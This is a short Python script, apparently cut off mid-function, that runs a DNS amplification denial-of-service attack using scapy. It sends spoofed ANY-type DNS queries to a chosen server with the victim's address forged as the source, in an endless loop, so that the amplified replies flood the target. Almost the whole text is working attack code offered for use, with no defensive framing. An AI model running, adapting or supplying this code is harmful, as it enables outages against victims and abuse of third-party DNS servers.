#!/usr/bin/env python3
#coding:utf-8


'''
step1 
python DNS_dos.py [target] [server_ip] [domain_ip] [domain_name] [threadcount]


'''
from scapy.all import *
from time import *
import thread

def dns_amplification_attack(target,server_ip,domain_name):
    while 1:
        send(IP(dst=server_ip,src=target)/UDP()/DNS(rd=1,qdcount=1,qd=DNSQR(qname=domain_name,qtype=255)),verbose=0)

def main():
    if len(sys.argv) != 5:
        print("error")